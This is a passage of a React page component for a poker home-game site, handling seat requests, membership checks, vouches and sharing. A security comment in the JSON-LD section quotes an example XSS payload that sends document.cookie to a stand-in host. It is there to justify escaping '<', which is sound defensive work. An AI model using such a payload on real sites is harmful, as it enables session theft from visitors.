        });
        if (res.ok) {
          const json = await res.json();
          if (json.status === 'friends') setFriendState('friends');
          else if (json.status === 'pending') setFriendState('pending');
          else setFriendState('none');
        }
      } catch (e) {}
    } finally {
      setFriendBusy(false);
      friendLockRef.current = false;
    }
  };

  // ── Non-member seat request ─────────────────────────────────────────────
  // WIRING FIX: the seat grid rendered by HomeGamesSeatReservation is
  // member-gated (rpc_hg_list_tables_and_reservations), so a signed-in
  // non-member who clicked "Pick a Seat" hit "Follow or join this home game to
  // see the seat list" with no join, follow or request affordance anywhere in
  // the modal — the conversion funnel of this SEO page dead-ended. This posts
  // to the purpose-built public endpoint, which upserts a pending membership,
  // creates the RSVP (or waitlists it when the game is full) and notifies the
  // host by push + DM.
  const submitSeatRequest = async () => {
    if (!seatEvent?.id || seatRequestBusy) return;
    const token = await getAccessToken();
    if (!token) {
      const returnTo = typeof window !== 'undefined'
        ? `${window.location.pathname}?seatEvent=${encodeURIComponent(seatEvent.id)}`
        : `/hub/home-games/${page.slug}?seatEvent=${encodeURIComponent(seatEvent.id)}`;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }
    setSeatRequestBusy(true);
    try {
      const note = seatRequestNote.trim().slice(0, 500);
      const res = await fetch(
        `/api/public/home-games/${encodeURIComponent(page.slug)}/events/${encodeURIComponent(seatEvent.id)}/request-seat`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
          body: JSON.stringify(note ? { message: note } : {}),
        }
      );
      const json = await res.json().catch(() => ({}));
      if (!res.ok || !json.success) {
        throw new Error(json.error || 'Could not send your seat request.');
      }
      const response = json.data?.rsvp?.response || 'yes';
      const membership = json.data?.membership?.status || 'pending';
      setSeatRequestResult({ response, membership });
      if (membership && membership !== 'active') setMemberStatus(membership);
      toast.success(
        response === 'waitlist'
          ? 'You are on the waitlist. The host has been notified.'
          : 'Seat request sent. The host has been notified.'
      );
    } catch (err) {
      console.warn('Seat request error:', err);
      toast.error(err.message || 'Could not send your seat request.');
    } finally {
      setSeatRequestBusy(false);
    }
  };

  const isOwnerViewing = !!currentUserId && (currentUserId === host?.id || currentUserId === group?.owner_id);

  // Membership gate for the live seat grid. GET /api/home-games/tables goes
  // through rpc_hg_list_tables_and_reservations, which is member-only.
  // The host/owner is included explicitly: owners do not always have a
  // commander_home_members row (see the same note in ./[slug]/dashboard.js),
  // so gating on memberStatus alone offered the host a "Request a Seat"
  // panel — which would file a pending membership request against their own
  // group — instead of the seat grid they saw before.
  const canSeeSeatList = isOwnerViewing || memberStatus === 'active' || memberStatus === 'approved';

  return (
    <>
      <SEOHead
        title={metaTitle}
        description={metaDesc}
        canonical={canonical}
        ogImage={page.cover_url || page.avatar_url || undefined}
      />
      <Head>
        {group.is_private && <meta name="robots" content="noindex, nofollow" />}
        {jsonLd.map((entry, i) => (
          <script
            key={i}
            type="application/ld+json"
            // F119: JSON.stringify does NOT escape '</script>'. Group fields
            // (name, description, host.display_name, game title/description)
            // are user-authored. Without escaping, a host can inject
            //   My Club</script><img src=x onerror=fetch('//evil/'+document.cookie)>
            // as their group name and every visitor to the public slug page
            // — including unauthenticated users — executes the payload.
            // Escape '<' -> '\u003c'; both are valid JSON, but the escaped
            // form can't terminate the <script> tag.
            dangerouslySetInnerHTML={{
              __html: JSON.stringify(entry).replace(/</g, '\\u003c')
            }}
          />
        ))}
      </Head>
      <div className="hgs-page">
        <UniversalHeader onMenuClick={() => setMenuOpen(true)} pageDepth={2} onBackClick={() => router.back()} />


        <div className="hgs-cover">
          {page.cover_url ? (
            <img src={page.cover_url} alt={page.name} className="hgs-cover-img" loading="eager" />
          ) : (
            <div className="hgs-cover-fallback" aria-hidden="true" />
          )}
          <div className="hgs-cover-fade" />
        </div>

        <div className="hgs-header">
          <div className="hgs-avatar">
            {page.avatar_url ? (
              <img src={page.avatar_url} alt="" loading="eager" />
            ) : (
              <div className="hgs-avatar-fallback">{(page.name || 'H')[0]}</div>
            )}
          </div>
          <div className="hgs-header-info">
            <h1 className="hgs-name">{page.name}</h1>
            <p className="hgs-meta">
              {page.city ? `${page.city}, ${page.state}` : 'Private Home Game'}
              {host?.display_name ? ` · Hosted by ${host.display_name}` : ''}
            </p>
            <div className="hgs-stats">
              <span><strong>{group.member_count}</strong> Members</span>
              <span><strong>{followerCount}</strong> Followers</span>
              <span><strong>{group.games_hosted}</strong> Games Hosted</span>
              {vouchCount > 0 && (
                <button
                  className="hgs-vouch-count-btn"
                  onClick={() => setVouchersModalOpen(true)}
                  title="See who vouched for this game"
                >
                  <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor" style={{flexShrink:0}}><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  <strong>{vouchCount}</strong> {vouchCount === 1 ? 'Player' : 'Players'} Vouched
                </button>
              )}
            </div>
            {(() => {
              // Single call — avoids double computation (was previously called twice).
              const rep = getReputationBadge(qualityScore, vitalityScore);
              if (!rep) return null;
              return (
                <div className="hgs-rep-badge" style={{ color: rep.color, background: rep.bg, border: `1px solid ${rep.border}` }}>
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
                  {rep.label}
                </div>
              );
            })()}
          </div>
          <div className="hgs-cta-row">
            {/* Host Dashboard had no entry point anywhere in the app — a host
                could only reach their own dashboard by typing the /dashboard
                suffix. Owners get it as the primary action on their own page. */}
            {isOwnerViewing && (
              <Link href={`/hub/home-games/${page.slug}/dashboard`} className="hgs-primary-btn">
                Host Dashboard
              </Link>
            )}
            {memberStatus === 'banned' ? null : (
              <button
                className={memberStatus === 'active' || memberStatus === 'approved' ? 'hgs-ghost-btn' : 'hgs-primary-btn'}
                onClick={handleJoinGroup}
                disabled={joinBusy || memberStatus === 'active' || memberStatus === 'approved' || memberStatus === 'pending'}
                title={memberStatus === 'pending' ? 'Request pending' : ''}
              >
                {joinBusy ? 'Requesting...' :
                 memberStatus === 'pending' ? 'Request Pending' :
                 (memberStatus === 'active' || memberStatus === 'approved') ? '✓ Member' :
                 'Join Group'}
              </button>
            )}
            {host?.id && (
              <button
                id="hgs-message-host-btn"
                className="hgs-ghost-btn"
                onClick={handleMessageHost}
                title={`Message ${host.display_name || 'Host'}`}
              >
                Message Host
              </button>
            )}
            {host?.id && currentUserId && currentUserId !== host.id && (
              <button
                id="hgs-add-friend-btn"
                className="hgs-ghost-btn"
                onClick={handleAddFriend}
                disabled={friendBusy || friendState !== 'none'}
                title={friendState === 'friends' ? 'Already Friends' : friendState === 'pending' ? 'Request Sent' : `Add ${host.display_name || 'Host'} as Friend`}
              >
                {friendState === 'friends' ? '✓ Friends' : friendState === 'pending' ? 'Request Sent' : friendBusy ? '…' : 'Add Friend'}
              </button>
            )}
            <button
              className={'hgs-follow-btn' + (isFollowing ? ' hgs-follow-btn-on' : '')}
              onClick={handleFollowToggle}
              disabled={followBusy}
              aria-pressed={isFollowing}
              aria-label={isFollowing ? 'Unfollow this home game' : 'Follow this home game'}
            >
              {followBusy ? '…' : (isFollowing ? '✓ Following' : '+ Follow')}
            </button>
            <button
              id="hgs-vouch-btn"
              className={'hgs-vouch-btn' + (hasVouched ? ' hgs-vouch-btn-on' : '')}
              onClick={handleVouchToggle}
              disabled={vouchBusy}
              aria-pressed={hasVouched}
              title={hasVouched ? 'Remove your vouch' : 'Vouch for this game'}
            >
              {vouchBusy ? '…' : (
                <>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill={hasVouched ? 'currentColor' : 'none'} stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/><path d="M7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
                  {hasVouched ? 'Vouched' : 'Vouch'}
                </>
              )}
            </button>
            <button className="hgs-ghost-btn" onClick={handleShare}>
              {copyState || 'Share'}
            </button>
            {followError && <span className="hgs-follow-err">{followError}</span>}
          </div>
        </div>

        <div className="hgs-body">
          <div className="hgs-col-main">
            {(group.description || group.tagline) && (
              <section className="hgs-section">
                <h2>About</h2>
                <p>{group.description || group.tagline}</p>
              </section>
            )}

            {/* Dan-fix/tournament-buildout: tournaments (format='tournament')
                surface in their own section above cash games. Tournaments use
                the shared TournamentList component which renders structure,
                buy-in, starting stack, and entries-cap. The Upcoming Games
                section below now shows only cash games to avoid duplication. */}
            {/* onView is required: TournamentList's public-mode footer renders
                only when `hostHref || onView`, so without it every tournament
                card was informational with no button at all — cash games got
                "Pick a Seat" and tournaments got a dead end. */}
            <TournamentList
              tournaments={(upcoming_games || []).filter((g) => g.format === 'tournament')}
              mode="public"
              title="Upcoming Tournaments"
              onView={openRequestSeatForTournament}
            />

            <section className="hgs-section">
              <h2>Upcoming Games</h2>
              {(upcoming_games || []).filter((g) => g.format !== 'tournament').length === 0 ? (
                (group.settings?.tables?.length > 0 || group.settings?.tournaments?.length > 0) ? (
                  <div className="hgs-empty" style={{ textAlign: 'left', padding: '24px', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '12px' }}>
                    <h3 style={{ fontSize: '16px', color: '#fff', marginBottom: '8px' }}>Regular Schedule</h3>
                    <p style={{ color: '#9ca3af', marginBottom: '16px' }}>{group.settings.schedule_summary || formatSchedule(group)}</p>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                      {group.settings.tables?.length > 0 && (
                        <div>
                          <strong style={{ color: '#22d3ee', display: 'block', marginBottom: '8px', fontSize: '14px' }}>Cash Games</strong>
                          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
                            {group.settings.tables.map((t, idx) => (
                              <span key={idx} style={{ padding: '4px 10px', background: 'rgba(34,211,238,0.1)', border: '1px solid rgba(34,211,238,0.2)', borderRadius: '6px', fontSize: '13px', color: '#22d3ee', fontWeight: '500' }}>
                                {GAME_TYPE_LABELS[t.game_type] || t.game_type?.toUpperCase() || 'Poker'} {t.stakes}
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                      {group.settings.tournaments?.length > 0 && (
                        <div>
                          <strong style={{ color: '#22d3ee', display: 'block', marginBottom: '8px', fontSize: '14px' }}>Tournaments</strong>
                          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
                            {group.settings.tournaments.map((t, idx) => {
                              const dayStr = t.day 
                                ? (t.day.charAt(0).toUpperCase() + t.day.slice(1).toLowerCase())
                                : '';
                              const timeStr = t.scheduled_time || t.time ? ` · ${t.scheduled_time || t.time}` : '';
                              return (
                                <span key={idx} style={{ padding: '4px 10px', background: 'rgba(34,211,238,0.1)', border: '1px solid rgba(34,211,238,0.2)', borderRadius: '6px', fontSize: '13px', color: '#e2e8f0', fontWeight: '500' }}>
                                  {dayStr && <span style={{ color: '#22d3ee', marginRight: '4px' }}>{dayStr}</span>}
                                  {t.name}{t.buy_in ? ` · $${t.buy_in}` : ''}
                                </span>
                              );
                            })}
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                ) : (
                  <div className="hgs-empty">No upcoming games scheduled. Check back soon.</div>
                )
              ) : (
                <div className="hgs-games-list">
                  {(upcoming_games || []).filter((g) => g.format !== 'tournament').map((g) => {
                    const seatsLeft = g.max_players ? Math.max(0, g.max_players - (g.rsvp_yes || 0)) : null;
                    const dparts = formatDate(g.scheduled_date).split(' ');
                    return (
                      <div key={g.id} className="hgs-game-card">
                        <div className="hgs-game-date">
                          <div className="hgs-game-mon">{dparts[1] || ''}</div>
                          <div className="hgs-game-day">{dparts[2] || ''}</div>
                          <div className="hgs-game-dow">{dparts[0] || ''}</div>
                        </div>
                        <div className="hgs-game-body">
                          <h3>{g.title || `${GAME_TYPE_LABELS[g.game_type] || g.game_type?.toUpperCase() || ''} ${g.stakes || ''}`.trim()}</h3>
                          <div className="hgs-game-meta">
                            {g.start_time && <span>{formatTime(g.start_time)}</span>}
                            {g.stakes && <span>· {g.stakes}</span>}
                            {seatsLeft !== null && <span>· {seatsLeft} seat{seatsLeft === 1 ? '' : 's'} left</span>}
                            {g.neighborhood && <span>· {g.neighborhood}</span>}
                          </div>
                          {g.description && <p className="hgs-game-desc">{g.description}</p>}
                        </div>
                        <button
                          className="hgs-game-rsvp"
                          onClick={() => openRequestSeat(g)}
                          aria-label={`Pick a seat at ${g.title || 'this game'}`}
                        >
                          Pick a Seat
                        </button>
                      </div>
                    );
                  })}
                </div>
              )}
            </section>

            {posts.length > 0 && (
              <section className="hgs-section">
                <h2>Recent Posts</h2>
                <div className="hgs-posts">
                  {posts.map((p) => (
                    <article key={p.id} className="hgs-post">
                      <header>
                        <strong>{p.author?.display_name || 'Host'}</strong>
                        <time>{new Date(p.created_at).toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}</time>
                        {p.is_pinned && <span className="hgs-post-pin">Pinned</span>}
                      </header>
                      <p>{p.content}</p>
                      <footer>
                        <span>{p.like_count || 0} likes</span>
                        <span>·</span>
                        <span>{p.comment_count || 0} comments</span>
                      </footer>
                    </article>
                  ))}
                </div>
              </section>
            )}
          </div>

          <aside className="hgs-col-side">
            <section className="hgs-section hgs-card">
              <h2>Schedule</h2>
              <dl className="hgs-kv">
                {group.settings?.tables?.length > 0 ? (
                  <div>
                    <dt>Cash Games</dt>
                    <dd>
                      {group.settings.tables.map((t, idx) => (
                        <div key={idx}>{GAME_TYPE_LABELS[t.game_type] || t.game_type?.toUpperCase() || 'Poker'} {t.stakes}</div>
                      ))}
                    </dd>
                  </div>
                ) : (
                  <div><dt>Game</dt><dd>{formatStakesLine(group)}</dd></div>
                )}
                {group.settings?.tournaments?.length > 0 && (
                  <div>
                    <dt>Tournaments</dt>
                    <dd>
                      {group.settings.tournaments.map((t, idx) => (
                        <div key={idx}>{t.name} {t.buy_in ? `($${t.buy_in})` : ''}</div>
                      ))}
                    </dd>
                  </div>
                )}
                {(group.settings?.schedule_summary || formatSchedule(group)) && <div><dt></dt><dd>{group.settings?.schedule_summary || formatSchedule(group)}</dd></div>}
                {group.typical_time && !group.settings?.schedule_summary && <div><dt>Time</dt><dd>{formatTime(group.typical_time)}</dd></div>}
                {(group.typical_buyin_min || group.typical_buyin_max) && (
                  <div><dt>Buy-in</dt><dd>${group.typical_buyin_min || '?'} – ${group.typical_buyin_max || '?'}</dd></div>
                )}
                {(() => {
                    // max_players is a single group-level column: the total cap
                    // for the whole game, NOT a per-table seat count. Multiplying
                    // it by the table count double-counted the cap (18-player
                    // group with 2 tables rendered as "36"). Show the cap as-is
                    // and use the table count only as context.
                    const totalMax = group.max_players || null;
                    if (!totalMax) return null;
                    // num_tables: count configured cash-game tables from settings (fallback: 1)
                    const numTables = group.settings?.tables?.length || 1;
                    const detail = numTables > 1 ? ` (across ${numTables} tables)` : '';
                    return <div><dt>Max Players</dt><dd>{totalMax}{detail}</dd></div>;
                })()}
                {group.contact_phone && (
                  <div>
                    <dt>Phone</dt>
                    <dd>
                      <a href={`tel:${group.contact_phone.replace(/\D/g, '')}`} style={{ color: 'inherit' }}>
                        {group.contact_phone}
                      </a>
                    </dd>
                  </div>
                )}
                {group.website_url && (
                  <div>
                    <dt>Website</dt>
                    <dd>
                      <a
                        href={group.website_url.startsWith('http') ? group.website_url : `https://${group.website_url}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        style={{ color: '#22d3ee', wordBreak: 'break-all' }}
                      >
                        {group.website_url.replace(/^https?:\/\//, '').replace(/\/$/, '')}
                      </a>
                    </dd>
                  </div>
                )}
              </dl>
            </section>

            <section className="hgs-section hgs-card">
              <h2>Share</h2>
              <div className="hgs-share-url">{shareUrl.replace(/^https?:\/\//, '')}</div>
              <button className="hgs-ghost-btn hgs-full" onClick={copyShareUrl}>
                {copyState || 'Copy Link'}
              </button>
            </section>

            <div className="hgs-footer-link">
              <button onClick={() => typeof window !== 'undefined' && window.history.length > 1 ? window.history.back() : router.push('/hub/poker-near-me/venues')} className="hgs-back-btn">
                ← Back
              </button>
            </div>
          </aside>
        </div>

        <HamburgerMenu isOpen={menuOpen} onClose={() => setMenuOpen(false)} worldKey="hub" />

        {/* ── Vouchers Modal ──────────────────────────────────────────── */}
        {vouchersModalOpen && (
          <div
            className="hgs-seat-backdrop"
            role="dialog"
            aria-modal="true"
            aria-label="Players who vouched"
            onClick={(e) => { if (e.target === e.currentTarget) setVouchersModalOpen(false); }}
          >
            <div className="hgs-vouchers-modal" ref={modalRef} tabIndex={-1}>
              <div className="hgs-seat-header">
                <h2 className="hgs-seat-title" style={{fontSize:'18px'}}>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#22d3ee" strokeWidth="2.5" style={{marginRight:8,verticalAlign:'middle'}}><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  {vouchCount} {vouchCount === 1 ? 'Player' : 'Players'} Vouched
                </h2>
                <button className="hgs-seat-close" onClick={() => setVouchersModalOpen(false)} aria-label="Close">×</button>
              </div>
              <p style={{fontSize:'13px',color:'rgba(255,255,255,.5)',margin:'0 0 16px',lineHeight:'1.5'}}>
                These players have personally vouched for this home game.
              </p>
              {vouchers.length === 0 ? (
                <div className="hgs-empty">No vouches yet. Be the first!</div>
              ) : (
                <div className="hgs-vouchers-list">
                  {vouchers.map((v) => (
                    <div key={v.user_id} className="hgs-voucher-row">
                      <div className="hgs-voucher-avatar">
                        {v.avatar_url
                          ? <img src={v.avatar_url} alt="" loading="lazy" />
                          : <span>{(v.display_name || 'P')[0].toUpperCase()}</span>
                        }
                      </div>
                      <div className="hgs-voucher-info">
                        <strong>{v.display_name}</strong>
                        <span>{new Date(v.vouched_at).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
                      </div>
                      <div className="hgs-voucher-check">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22d3ee" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                      </div>
                    </div>
                  ))}
                </div>
              )}
              <button
                className={'hgs-vouch-btn hgs-full' + (hasVouched ? ' hgs-vouch-btn-on' : '')}
                style={{marginTop:'16px',justifyContent:'center'}}
                onClick={() => { setVouchersModalOpen(false); handleVouchToggle(); }}
                disabled={vouchBusy}
              >
                {vouchBusy ? '…' : (hasVouched ? '✓ You Vouched — Remove' : '+ Add Your Vouch')}
              </button>
            </div>
          </div>
        )}

        {/* ── Share Modal ──────────────────────────────────────────────── */}
        {shareModalOpen && (
          <div
            className="hgs-seat-backdrop"
            role="dialog"
            aria-modal="true"
            aria-label="Share this home game"
            onClick={(e) => { if (e.target === e.currentTarget) setShareModalOpen(false); }}
          >
            <div className="hgs-vouchers-modal" style={{ maxWidth: '380px' }} ref={modalRef} tabIndex={-1}>
              <div className="hgs-seat-header">
                <h2 className="hgs-seat-title" style={{ fontSize: '18px' }}>Share {page.name}</h2>
                <button className="hgs-seat-close" onClick={() => setShareModalOpen(false)} aria-label="Close">×</button>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '16px 0 0' }}>
                {/* Share to Smarter.Poker Feed */}
                <button
                  onClick={handleShareToFeed}
                  style={{ display: 'flex', alignItems: 'center', gap: '12px', background: 'rgba(34,211,238,0.08)', border: '1px solid rgba(34,211,238,0.25)', borderRadius: '10px', padding: '12px 16px', color: '#e2e8f0', cursor: 'pointer', fontSize: '14px', fontWeight: '600', textAlign: 'left' }}
                >
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#22d3ee" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                  <div>
                    <div>{sharePosted ? '✓ Posted to Feed!' : 'Post to Smarter.Poker Feed'}</div>
                    <div style={{ fontSize: '12px', color: '#64748b', fontWeight: 400 }}>Share with the community</div>
                  </div>
                </button>
                {/* Twitter/X */}
                <a
                  href={`https://twitter.com/intent/tweet?text=${encodeURIComponent(`Check out ${page.name} — a poker home game! `)}&url=${encodeURIComponent(shareUrl)}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ display: 'flex', alignItems: 'center', gap: '12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px', padding: '12px 16px', color: '#e2e8f0', textDecoration: 'none', fontSize: '14px', fontWeight: '600' }}
                >
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="#e2e8f0"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.748l7.73-8.835L1.254 2.25H8.08l4.256 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                  <div>
                    <div>Share on X (Twitter)</div>
                    <div style={{ fontSize: '12px', color: '#64748b', fontWeight: 400 }}>Post to your followers</div>
                  </div>
                </a>
                {/* Facebook */}
                <a
                  href={`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ display: 'flex', alignItems: 'center', gap: '12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px', padding: '12px 16px', color: '#e2e8f0', textDecoration: 'none', fontSize: '14px', fontWeight: '600' }}
                >
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                  <div>
                    <div>Share on Facebook</div>
                    <div style={{ fontSize: '12px', color: '#64748b', fontWeight: 400 }}>Share with friends</div>
                  </div>
                </a>
                {/* Copy Link */}
                <button
                  onClick={async () => { await copyShareUrl(); setTimeout(() => setShareModalOpen(false), 1200); }}
                  style={{ display: 'flex', alignItems: 'center', gap: '12px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px', padding: '12px 16px', color: '#e2e8f0', cursor: 'pointer', fontSize: '14px', fontWeight: '600', textAlign: 'left' }}
                >
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                  <div>
                    <div>{copyState || 'Copy Link'}</div>
                    <div style={{ fontSize: '12px', color: '#64748b', fontWeight: 400 }}>{shareUrl.replace(/^https?:\/\//, '')}</div>
                  </div>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ── Request-Seat Modal ───────────────────────────────────────── */}
        {seatEvent && (
          <div
            className="hgs-seat-backdrop"
            role="dialog"
            aria-modal="true"
            aria-labelledby="hgs-seat-title"
            onClick={(e) => { if (e.target === e.currentTarget) closeRequestSeat(); }}
          >
            <div className="hgs-seat-modal hgs-seat-modal-wide" ref={modalRef} tabIndex={-1}>
              <div className="hgs-seat-header">
                <div>
                  <h2 id="hgs-seat-title" className="hgs-seat-title">
                    {seatEvent.title || `${GAME_TYPE_LABELS[seatEvent.game_type] || ''} ${seatEvent.stakes || ''}`.trim() || 'Pick a seat'}
                  </h2>
                  <p className="hgs-seat-sub">
                    {formatDate(seatEvent.scheduled_date)}
                    {seatEvent.start_time ? ` · ${formatTime(seatEvent.start_time)}` : ''}
                    {seatEvent.neighborhood ? ` · ${seatEvent.neighborhood}` : ''}
                  </p>
                </div>
                <button
                  type="button"
                  className="hgs-seat-close"
                  aria-label="Close"
                  onClick={closeRequestSeat}
                >
                  ×
                </button>
              </div>
              {canSeeSeatList ? (
                <HomeGamesSeatReservation
                  gameId={seatEvent.id}
                  currentUserId={currentUserId}
                  isHost={false}
                />
              ) : memberStatus === 'banned' ? (
                <div className="hgs-seat-request">
                  <p className="hgs-seat-request-lead">
                    You can&apos;t request a seat at this home game.
                  </p>
                </div>
              ) : memberStatus === null ? (
                <div className="hgs-seat-request">
                  <p className="hgs-seat-request-lead">Checking your membership…</p>
                </div>
              ) : seatRequestResult ? (
                <div className="hgs-seat-request">
                  <p className="hgs-seat-request-lead">
                    {seatRequestResult.response === 'waitlist'
                      ? 'You are on the waitlist for this game.'
                      : 'Your seat request has been sent.'}
                  </p>
                  <p className="hgs-seat-request-note">
                    {seatRequestResult.membership === 'active'
                      ? 'The host has been notified and will confirm your seat.'
                      : 'The host has been notified. Once they approve you, the live seat list opens up here.'}
                  </p>
                  <button type="button" className="hgs-ghost-btn hgs-full" onClick={closeRequestSeat}>
                    Done
                  </button>
                </div>
              ) : (
                <div className="hgs-seat-request">
                  <p className="hgs-seat-request-lead">
                    {memberStatus === 'pending'
                      ? 'Your membership is awaiting host approval.'
                      : 'The live seat list is for members of this home game.'}
                  </p>
                  <p className="hgs-seat-request-note">
                    Request a seat and the host gets your request straight away. They&apos;ll
                    approve you and confirm your seat — no need to join first.
                  </p>
                  <label className="hgs-seat-request-label" htmlFor="hgs-seat-request-note">
                    Add a note for the host (optional)
                  </label>
                  <textarea
                    id="hgs-seat-request-note"
                    className="hgs-seat-request-input"
                    value={seatRequestNote}
                    onChange={(e) => setSeatRequestNote(e.target.value.slice(0, 500))}
                    maxLength={500}
                    rows={3}
                    placeholder="Anything the host should know?"
                  />
                  <button
                    type="button"
                    className="hgs-primary-btn hgs-full"
                    onClick={submitSeatRequest}
                    disabled={seatRequestBusy}
                  >
                    {seatRequestBusy ? 'Sending…' : 'Request a Seat'}
                  </button>
                </div>
              )}
            </div>
          </div>
        )}

        <style>{pageStyles}</style>
      </div>
    </>
  );
}

const pageStyles = `
.hgs-page{min-height:100vh;background:linear-gradient(180deg,#0a0f1c 0%,#050810 100%);color:#fff;font-family:"Inter",-apple-system,sans-serif;padding-bottom:80px}
.hgs-notfound{min-height:60vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 20px}
.hgs-notfound h1{font-size:24px;margin:0 0 8px}
.hgs-notfound p{color:rgba(255,255,255,.6);margin-bottom:20px;max-width:420px}
.hgs-cover{position:relative;height:220px;width:100%;overflow:hidden;background:linear-gradient(135deg,#1e293b,#0f172a)}
.hgs-cover-img{width:100%;height:100%;object-fit:cover}
.hgs-cover-fallback{width:100%;height:100%;background:linear-gradient(135deg,#0d2137 0%,#0a1628 50%,#050810 100%)}
.hgs-cover-fade{position:absolute;inset:0;background:linear-gradient(180deg,rgba(10,15,28,0) 40%,rgba(10,15,28,.85) 100%)}
.hgs-header{max-width:1100px;margin:-60px auto 0;padding:0 20px;display:flex;align-items:flex-end;gap:20px;flex-wrap:wrap;position:relative;z-index:2}
.hgs-avatar{width:128px;height:128px;border-radius:16px;background:#111827;border:4px solid #050810;overflow:hidden;flex-shrink:0;box-shadow:0 8px 24px rgba(0,0,0,.5)}
.hgs-avatar img{width:100%;height:100%;object-fit:cover}
.hgs-avatar-fallback{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:56px;font-weight:900;color:#22d3ee;background:#0d1f33}
.hgs-header-info{flex:1;min-width:260px}
.hgs-name{font-size:28px;font-weight:900;margin:0 0 4px;letter-spacing:-.5px}
.hgs-meta{color:rgba(255,255,255,.65);font-size:14px;margin:0 0 10px}
.hgs-stats{display:flex;gap:18px;flex-wrap:wrap;font-size:13px;color:rgba(255,255,255,.5)}
.hgs-stats strong{color:#fff;font-weight:700;margin-right:4px}
.hgs-cta-row{display:flex;gap:8px;flex-wrap:wrap}
.hgs-primary-btn{padding:10px 18px;background:linear-gradient(135deg,#0ea5e9,#0284c7);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:800;letter-spacing:.5px;cursor:pointer;box-shadow:0 4px 14px rgba(14,165,233,.3);display:inline-block;text-decoration:none;transition:transform .15s}
.hgs-primary-btn:hover{transform:translateY(-1px)}
.hgs-ghost-btn{padding:10px 18px;background:rgba(255,255,255,.08);color:#fff;border:1px solid rgba(255,255,255,.15);border-radius:8px;font-size:13px;font-weight:700;cursor:pointer}
.hgs-ghost-btn:hover{background:rgba(255,255,255,.14)}
.hgs-follow-btn{padding:10px 18px;background:rgba(14,165,233,.12);color:#38bdf8;border:1.5px solid rgba(14,165,233,.4);border-radius:8px;font-size:13px;font-weight:800;letter-spacing:.3px;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:4px}
.hgs-follow-btn:hover:not(:disabled){background:rgba(14,165,233,.22);border-color:rgba(14,165,233,.6)}
.hgs-follow-btn:disabled{opacity:.5;cursor:not-allowed}
.hgs-follow-btn-on{background:rgba(14,165,233,.25);color:#fff;border-color:#0ea5e9}
.hgs-follow-btn-on:hover:not(:disabled){background:rgba(14,165,233,.35);border-color:#0ea5e9}
.hgs-follow-err{color:#f87171;font-size:12px;padding:6px 10px;background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.2);border-radius:6px;align-self:center}
.hgs-full{width:100%}
